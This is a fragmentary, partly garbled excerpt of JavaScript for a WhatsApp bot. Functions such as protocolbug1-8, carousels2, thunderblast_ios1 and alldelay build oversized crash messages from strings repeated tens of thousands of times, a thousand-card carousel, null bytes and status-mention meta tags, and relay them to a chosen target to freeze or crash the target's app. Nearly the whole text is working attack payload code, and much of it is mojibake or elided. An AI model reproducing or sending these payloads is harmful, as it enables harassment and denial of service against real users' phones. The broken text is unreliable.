...
async function protocolbug1(sock, target, mention) {
...
message: {
listResponseMessage: {
title: "ð©¸ ðÍ ð¢Ì»ð³Í¢ð±Í¯ðÌ»ðÍð¥Ì»ð³Í¡ ðÍ ðÌ»ðÍ¢ð¢ÍðÍ¯ð¢Ì»ðÌ»ð¥-ðÍ¯ð",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "ð" },
contextInfo: {
...
{
tag: "meta",
attrs: { is_status_mention: "ð ð¥ð¶ðððð²ð¹ð - ð§ð¿ð®ððµ ð£ð¿ð¼ðð¼ð°ð¼ð¹" },
content: undefined
}
]
}
...
async function protocolbug2(sock, target, mention) {
...
async function protocolbug3(sock, target, shibal) {
  ...
  if (shibal) {
    ...
    await sock.relayMessage(target, payment, kuntul);
  }
}
...
async function protocolbug8(sock, target, mention) {
    ...
    const embeddedMusic = {
        ...
        author: ".Rizxvelz Official" + "áá".repeat(10000),
        title: "Zoro",
      ...
      statusMentionMessage: {
        message: {
          ...
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "ð©¸ ðÍ ð¢Ì»ð³Í¢ð±Í¯ðÌ»ðÍð¥Ì»ð³Í¡ ðÍ ðÌ»ðÍ¢ð¢ÍðÍ¯ð¢Ì»ðÌ»ð¥-ðÍ¯ð" },
              content: undefined
            }
          ]
        }
...
async function carousels2(target, fJids) {
  ...
  const header = proto.Message.InteractiveMessage.Header.fromObject({
    ...
    title: 'â¤âÍððððððê³ðððððÍââ¤ÍÍÍÍÍ ð©¸â¦',
    gifPlayback: false,
    subtitle: 'â¤âÍððððððê³ðððððÍÍââ¤ÍÍÍÍÍ ð©¸â¦',
  ...
  for (let r = 0; r < 1000; r++) {
    cards.push({
      header,
      body: {
        text: "â¤âÍððððððê³ðððððÍââ¤ÍÍÍÍÍ ð©¸â¦"
      },
      nativeFlowMessage: {
        buttons: [
          {
...
await sock.relayMessage(isTarget, pesan.message, jids ? {
participant: { jid: isTarget }
} : {});
console.log("ððððððð ðððð ðððð")
}
async function thunderblast_ios1(target) {
    const TravaIphone = "ððµð´ð¿".repeat(60000);
        ...
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: { text: bodyText },
                    nativeFlowMessage: {
                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"ð","flow_id":"UNDEFINEDONTOP","flow_message_version":"9.903","flow_token":"UNDEFINEDONTOP"}`
                    },
                    contextInfo: {
    ...
    const msg1 = await genMsg(`${TravaIphone}ï¸`, "ððµð´ð¿".repeat(1000));
                ...
                viewOnceMessage: {
                    message: {
                        ...
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({ text: `${"ð¦".repeat(40000)}wkwkwkwkwkkwkwkwkwk2kwkwkwkkqkwkkwkwkwwkkwk\n\u0000` }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ text: "`YT:` https://youtube.com/@sockieMods" }),
          ...
          contextInfo: {
            ...
            quotedMessage: {
              documentMessage: {
                ...
                fileName: "â¤âÍððððððê³ðððððÍââ¤ÍÍÍÍÍ ð©¸â¦",
        ...
        await sock.relayMessage(
            ...
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "â¤âÍððððððê³ðððððÍââ¤ÍÍÍÍÍ ð©¸â¦" },
                        content: undefined
                    }
                ]
            }
  ...
  const payload = {
    ...
    message: {
      extendedTextMessage: {
        ...
        title: "ðððððð",
        description: "â¤âÍððððððê³ðððððÍââ¤ÍÍÍÍÍ ð©¸â¦",
...
async function alldelay(target) {
    ...
    console.log(`â alldelay finished for: ${target} in ${seconds}s`);
}
                    ...
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                ...
                                newsletterName: "â¤âÍððððððê³ðððððÍââ¤ÍÍÍÍÍ ð©¸â¦" + "ê¦¾".repeat(120000),
